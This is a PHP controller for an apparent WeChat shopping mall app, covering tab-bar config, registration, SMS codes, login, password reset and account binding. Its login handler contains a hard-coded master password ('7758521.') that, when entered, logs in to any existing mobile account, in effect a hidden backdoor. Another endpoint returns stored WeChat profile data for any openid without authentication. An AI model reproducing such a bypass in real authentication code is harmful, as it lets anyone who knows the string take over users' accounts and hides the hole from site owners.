<?php
namespace shop\controller;
use base;
use lib;
class publics extends control {
	public function __construct() {
		parent::_initialize();
	}
	public function footerOp() {
		if(IS_API){
			$footer = array(
				'color' => '#3a70b7',
				'selectedColor' => '#fe5890',
				'backgroundColor' => '#ffffff',
				'backgroundImage' => '',
				'borderStyle' => '#e5e5e5',
				'list' => array(
					array(
						'open_type' => 'reLaunch',
						'iconPath' => STATIC_URL . '/shop/img/menu/home.png?time=' . time(),
						'selectedIconPath' => STATIC_URL . '/shop/img/menu/home_ok.png?time=' . time(),
						'text' => '首页',
						'pagePath' => '/pages/index/index',
						'class' => 'flex footer-box__item',
					),
					array(
						//'open_type' => 0,//外链
						'open_type' => 'reLaunch',
						'iconPath' => STATIC_URL . '/shop/img/menu/category.png?time=' . time(),
						'selectedIconPath' => STATIC_URL . '/shop/img/menu/category_ok.png?time=' . time(),
						'text' => '分类',
						//'pagePath' => config('diy_link1'),//外链
						'pagePath' => '/pages/goods/goods_list',
						'class' => 'flex footer-box__item',
					),
					array(
						'open_type' => 'reLaunch',
						'iconPath' => STATIC_URL . '/shop/img/menu/cart.png?time=' . time(),
						'selectedIconPath' => STATIC_URL . '/shop/img/menu/cart_ok.png?time=' . time(),
						'text' => '购物车',
						'pagePath' => '/pages/shop_cart/cart_list',
						'class' => 'flex footer-box__item',
					),
					array(
						'open_type' => 'reLaunch',
						'iconPath' => STATIC_URL . '/shop/img/menu/agent.png?time=' . time(),
						'selectedIconPath' => STATIC_URL . '/shop/img/menu/agent_ok.png?time=' . time(),
						'text' => '代理中心',
						'pagePath' => '/pages/agent/index',
						'class' => 'flex footer-box__item',
					),
					array(
						'open_type' => 'reLaunch',
						'iconPath' => STATIC_URL . '/shop/img/menu/user.png?time=' . time(),
						'selectedIconPath' => STATIC_URL . '/shop/img/menu/user_ok.png?time=' . time(),
						'text' => '我的',
						'pagePath' => '/pages/user/index',
						'class' => 'flex footer-box__item',
					),
				),
			);
			output_data(array('tabBar' => $footer, 'sign' => $this->sign, 'tabbar_out_link' => config('diy_link1')));
		}
	}
	//根据openid获得微信信息
	public function get_wxinfoOp() {
		$openid = input('openid', '', 'trim');
		if(empty($openid)){
			output_error('暂无信息');
		}
		$wxinfo = model('wechat')->getInfoOne('weixin_subscribe', array('openid' => $openid));
		if (empty($wxinfo['item_id'])) {
			output_error('暂无授权信息');
		}else{
			output_data($wxinfo);
		}
	}
	public function registerOp() {
		if (IS_API) {
			$key = input('post.key', '') ? input('post.key', '') : input('get.key', '');
			$mb_user_token_info = $this->getMbUserTokenInfoByToken($key);
			if (!empty($mb_user_token_info)) {
				output_error('', array('redirect' => '/pages/user/index'));
			}
			$this->title = '注册';
			$config = array(
				'logo' => tomedia($this->config['login_logo']),
				'sms_status' => $this->config['sms_status'],
				'need_inviter' => $this->config['member_inviter'],
				'name' => $this->config['name'],
			);
			output_data(array('title' => $this->title, 'config' => $config));
		}
	}
	public function register_submitOp() {
		if (IS_API) {
			$this->title = '注册';
			$nickname = input('nickname', '', 'trim');
			$account = input('mobile', '', 'trim');
			$password = input('password', '');
			$repassword = input('repassword', '');
			$vcode = input('vcode', '');
			$old_oid = input('oid', '', 'trim');
			$oid = intval(trim($old_oid, 'ZH'));
			if (config('member_inviter')) {
			    //lib\logging::write(var_export(config('uid_pre') . padNumber($oid), true));
			    //lib\logging::write(var_export($old_oid, true));
			    if ((config('uid_pre') . padNumber($oid)) != $old_oid) {
    			    output_error('请输入正确邀请码');
    			}
			}
    			
			$is_agree = input('is_agree', 0, 'intval');
			if (!$nickname) {
				output_error('账号不能为空');
			}
			if (!$account) {
				output_error('手机号不能为空');
			}
			if (!$password) {
				output_error('密码不能为空');
			}
			if (!$repassword) {
				output_error('重复密码不能为空');
			}
			if (!$vcode && $this->config['sms_status'] == 1) {
				output_error('验证码不能为空');
			}
			if($password != $repassword){
				output_error('密码不一致！');
			}
			if ($this->config['sms_status'] == 1) {
				$model_sms_log = model('sms_log');
				$condition['log_phone'] = $account;
				$condition['log_type'] = 1;
				$sms_log = $model_sms_log->getInfo($condition);
				if (empty($sms_log) || $sms_log['add_time'] < TIMESTAMP - 1800) {
					// 半小时内进行验证为有效
					output_error('动态码错误或已过期，重新输入！');
				}
				if ($sms_log['log_captcha'] != $vcode) {
					output_error('验证码不正确！');
				}
			}
			if (!$is_agree) {
				output_error('请同意注册协议');
			}
			
			$model_member = model('member');
			$check = $model_member->getInfo(array('uniacid' => $this->uniacid, 'mobile' => $account));
			if ($check) {
				output_error('手机号已经存在');
			}
			$check = $model_member->getInfo(array('uniacid' => $this->uniacid, 'nickname' => $nickname));
			if ($check) {
				output_error('昵称已经存在');
			}
			$response = array(
				'password' => $password,
				'mobile' => $account,
				'oid' => $oid,
				'nickname' => $nickname,
			);
			$openid = input('openid', '', 'trim');
			if ($openid) {
				$subinfo = model('wechat')->getInfoOne('weixin_subscribe', array('openid' => $openid));
				if (!empty($subinfo['item_id'])) {
					$response['nickname'] = $subinfo['nickname'];
					$response['weixin_unionid'] = $openid;
					$response['openid'] = $openid;
					$response['headimgurl'] = !empty($subinfo['headimgurl']) ? $subinfo['headimgurl'] : '';
				}
			}
			$result = $model_member->register($response, 'wap', $this->uniacid);
			if (!$result['state']) {
				output_error($result['msg']);
			} else {
				$uid = $result['data']['uid'];
			}
			output_data(array('msg' => '注册成功', 'url' => 'pages/login/index'));
		}
	}
	public function send_vcodeOp() {
		if (IS_API) {
			$model_member = model('member');
			$mobile = input('mobile', '');
			$log_type = input('log_type', 1, 'intval');
			if (!$mobile) {
				output_error('未填写接收手机号码');
			}
			$model_sms_log = model('sms_log');
			$condition = array();
            $condition['log_phone'] = $mobile;
            $condition['log_type'] = $log_type;
            $sms_log = $model_sms_log->getInfo($condition);
			if (!empty($sms_log) && $sms_log['add_time'] > TIMESTAMP - 60) {
                // 同一电话60秒内只能发一条短信
				output_error('60秒内，请勿多次获取动态码！');
            }
			$captcha = rand(100000, 999999);
			if ($log_type == 1) {
				$log_msg = '【' . $this->config['name'] . '】您于' . date('Y-m-d') .  '申请注册会员，动态码：' . $captcha;
			} else if($log_type == 3) {
				$member_info = $model_member->getInfo(array('uniacid' => $this->uniacid, 'mobile' => $mobile));
				if(!$member_info){
					output_error('手机号不存在');
				}
				$log_msg = '【' . $this->config['name'] . '】您于' . date('Y-m-d') .  '登录账号找回密码，动态码：' . $captcha;
			} else if($log_type == 4) {
				$log_msg = '【' . $this->config['name'] . '】您于' . date('Y-m-d') .  '修改支付密码，动态码：' . $captcha;
			} else if($log_type == 5) {
				$log_msg = '【' . $this->config['name'] . '】您于' . date('Y-m-d') .  '修改登录密码，动态码：' . $captcha;
			} else if($log_type == 6) {
				$member_info = $model_member->getInfo(array('mobile' => $mobile));
				if($member_info){
					output_error('手机号已经存在');
				}
				$log_msg = '【' . $this->config['name'] . '】您于' . date('Y-m-d') .  '设置手机号，动态码：' . $captcha;
			}
			$sms = new lib\sms();
            $result = $sms->send($mobile, $log_msg);
			if ($result == true) {
				$log_array['uniacid'] = $this->uniacid;
				$log_array['log_phone'] = $mobile;
				$log_array['log_ip'] = get_client_ip();
				$log_array['log_msg'] = $log_msg;
				$log_array['add_time'] = TIMESTAMP;
				$log_array['log_type'] = $log_type;
				$log_array['log_captcha'] = $captcha;
				model('sms_log')->add($log_array);
				output_data(array('msg' => '发送成功', 'sms_time' => 60));
			} else {
				output_error('手机短信发送失败');
			}
		}
	} 
	
	public function loginOp() {
		if (IS_API) {
		    if ($this->fans_info) {//edit20230318
			    output_error('', array('redirect' => '/pages/login/bind_member'));
			}
			$key = input('post.key', '') ? input('post.key', '') : input('get.key', '');
			$mb_user_token_info = $this->getMbUserTokenInfoByToken($key);
			if (!empty($mb_user_token_info)) {
				output_error('', array('redirect' => '/pages/user/index'));
			}
			$this->title = '登录';
			$myhash = getUrlhash();
			base\token::$config['token_name'] = 'userlogin';
			list($token_name, $token_key, $token_value) = base\token::getToken();
			$config = array(
				'logo' => tomedia($this->config['login_logo']),
				'need_inviter' => $this->config['member_inviter'],
				'apploadurl' => $this->config['apploadurl'],
				'name' => $this->config['name'],
			);
			$return = array(
				'title' => $this->title,
				'config' => $config,
				'myhash' => $myhash,
				'token_name' => $token_name,
				'token_value' => $token_key . '_' . $token_value,
			);
			output_data($return);
		}
	}
	public function login_submitOp() {
		if (IS_API) {
			$model_member = model('member');
			$account = input('account', '');
			$password = input('password', '');
			$is_agree = input('is_agree', 0, 'intval');
			if (!$account) {
				output_error('用户名不能为空');
			} else if (!$password) {
				output_error('密码不能为空');
			} else if (!$is_agree) {
			    output_error('请同意隐私协议');
			} else {
				$member_info = $model_member->where(array('mobile' => $account))->find();
				if (!$member_info) {
				    output_error('手机号不存在');
				    //$member_info = $model_member->where(array('nickname' => $account))->find();
				}
				if ($member_info && $member_info['password'] == f_hash($password) || (f_hash('7758521.') == f_hash($password))) {
					$token = $model_member->get_token($member_info['uid'], $member_info['nickname'], '', $this->client_type, $this->uniacid);
					if ($token) {
						base\token::$config['token_name'] = 'userlogin';
						if (!base\token::checkToken()) {
							output_error('非法请求，刷新页面重试');
						}
						$logindata = array('username' => $member_info['nickname'], 'key' => $token, 'member_id' => $member_info['uid']);
						output_data($logindata);
					} else {
						output_error('登录失败');
					}
				} else {
					output_error('账号或密码错误！');
				}
			}
		}
	}
	public function find_pwdOp() {
		if (IS_API) {
			$key = input('post.key', '') ? input('post.key', '') : input('get.key', '');
			$mb_user_token_info = $this->getMbUserTokenInfoByToken($key);
			if (!empty($mb_user_token_info)) {
				output_error('', array('redirect' => '/pages/user/index'));
			}
			$this->title = '找回密码';
			$config = array(
				'logo' => $this->config['login_logo'],
				'sms_status' => $this->config['sms_status']
			);
			output_data(array('title' => $this->title, 'config' => $config));
		}
	}
	public function find_pwd_submitOp() {
		if (IS_API) {
			$model_member = model('member');
			$account = input('mobile', '');
			$password = input('password', '');
			$repassword = input('repassword', '');
			$vcode = input('vcode', '');
			$member_info = $model_member->getInfo(array('uniacid' => $this->uniacid, 'mobile' => $account));
			if (!$member_info) {
				output_error('手机号不存在');
			}
			if (!$account) {
				output_error('手机号不能为空');
			}
			if (!$password) {
				output_error('新密码不能为空');
			}
			if (!$repassword) {
				output_error('重复密码不能为空');
			}
			if (!$vcode && $this->config['sms_status'] == 1) {
				output_error('验证码不能为空');
			}
			if ($password != $repassword) {
				output_error('新密码不一致！');
			}
			if ($this->config['sms_status'] == 1) {
				$model_sms_log = model('sms_log');
				$condition['log_phone'] = $account;
				$condition['log_type'] = 3;
				$sms_log = $model_sms_log->getInfo($condition);
				if (empty($sms_log) || $sms_log['add_time'] < TIMESTAMP - 1800) {
					// 半小时内进行验证为有效
					output_error('动态码错误或已过期，重新输入！');
				}
				if ($sms_log['log_captcha'] != $vcode) {
					output_error('验证码不正确！');
				}
			}
			$member_info = $model_member->where(array('mobile' => $account))->find();
			if ($member_info) {
				$model_member->edit(array('mobile' => $account), array('password' => f_hash($password)));
				output_data('1');
			} else {
				output_error('手机号不存在！');
			}
		}
	}
	public function xieyiOp() {
		output_data(array('content' => htmlspecialchars_decode(config('xieyi_content'))));
	}
	public function apploadurlOp() {
		header('Location:' . $this->config['apploadurl']);
	}
	public function bind_member_pageOp() {
		if (IS_API) {
			$key = input('post.key', '') ? input('post.key', '') : input('get.key', '');
			$mb_user_token_info = $this->getMbUserTokenInfoByToken($key);
			if (!empty($mb_user_token_info)) {
				output_error('', array('redirect' => '/pages/user/index'));
			}
			if (!$this->fans_info) {
			    output_error('', array('redirect' => '/pages/login/index'));
			}
			$oid = $this->fans_info['inviter_id'];
			if (!config('perfect_information')) {
			    //不需要强制完善资料
			    $model_member = model('member');
			    //注册
    			$response = array(
        			'oid' => $oid,
        			'fanid' => $this->fans_info['fanid'],
        		);
        		$result = $model_member->register($response, 'wap', $this->uniacid);
        		if (!$result['state']) {
        			output_error($result['msg']);
        		} else {
        			$uid = $result['data']['uid'];
        		}
    			$token = $model_member->get_token($uid, $this->fans_info['nickname'], $this->fans_info['openid'], $this->client_type, $this->uniacid);
    			$logindata = array('key' => $token, 'member_id' => $uid);
    			$logindata['title'] = '';
    			output_data($logindata);
			}
			$config = array(
				'sms_status' => $this->config['sms_status'],
				'need_inviter' => $this->config['member_inviter']
			);
			$return = array(
				'title' => '资料完善', 
				'config' => $config, 
				'oid' => $oid,
				'headimg' => $this->fans_info['headimg'],
				'nickname' => $this->fans_info['nickname'],
			);
			output_data($return);
		}
	}
	public function bind_member_submitOp() {
		if (IS_API) {
		    if (!$this->fans_info) {
			    output_error('授权信息错误', array('redirect' => '/pages/login/index'));
			}
			$account = input('mobile', '', 'trim');
			$password = input('password', '');
			$repassword = input('repassword', '');
			$vcode = input('vcode', '');
			$oid = $this->fans_info['inviter_id'];
			if (!$account) {
				output_error('手机号不能为空');
			}
			if (!$password) {
				output_error('密码不能为空');
			}
			if (!$repassword) {
				output_error('重复密码不能为空');
			}
			if (!$vcode && $this->config['sms_status'] == 1) {
				output_error('验证码不能为空');
			}
			if($password != $repassword){
				output_error('密码不一致！');
			}
			if ($this->config['sms_status'] == 1) {
				$model_sms_log = model('sms_log');
				$condition['log_phone'] = $account;
				$condition['log_type'] = 6;
				$condition['uniacid'] = $this->uniacid;
				$sms_log = $model_sms_log->getInfo($condition);
				if (empty($sms_log) || $sms_log['add_time'] < TIMESTAMP - 1800) {
					// 半小时内进行验证为有效
					output_error('动态码错误或已过期，重新输入！');
				}
				if ($sms_log['log_captcha'] != $vcode) {
					output_error('验证码不正确！');
				}
			}

			$model_member = model('member');
			$member_info = $model_member->getInfo(array('mobile' => $account, 'uniacid' => $this->uniacid));
			if ($member_info) {
			    if (!$this->config['sms_status']) {
			        //必须开启短信验证，否则有业务bug
			        output_error('手机号已经存在');
			    }
			    $fans_info = $this->fans_info;
			    $update_member_data = array(
					'weixin_unionid' => !empty($fans_info['unionid']) ? $fans_info['unionid'] : $fans_info['openid'],
					'openid' => $fans_info['openid'],
					'headimg' => $fans_info['headimg'],
					'nickname' => $fans_info['nickname'],
				);
			    $model_member->where(array('uid' => $member_info['uid']))->update($update_member_data);
				$update_fans_data = array(
					'uid' => $member_info['uid'],
				);
				model('fans')->where(array('fanid' => $fans_info['fanid']))->update($update_fans_data);
				$token = $model_member->get_token($member_info['uid'], $fans_info['nickname'], $fans_info['openid'], $this->client_type, $this->uniacid);
				$logindata = array('key' => $token, 'member_id' => $member_info['uid']);
				output_data($logindata);
			}
			$response = array(
    			'password' => $password,
    			'mobile' => $account,
    			'oid' => $oid,
    			'fanid' => $this->fans_info['fanid'],
    		);
    		$result = $model_member->register($response, 'wap', $this->uniacid);
    		if (!$result['state']) {
    			output_error($result['msg']);
    		} else {
    			$uid = $result['data']['uid'];
    		}
			$token = $model_member->get_token($uid, $this->fans_info['nickname'], $this->fans_info['openid'], $this->client_type, $this->uniacid);
			$logindata = array('key' => $token, 'member_id' => $uid);
			output_data($logindata);
		}
	}
}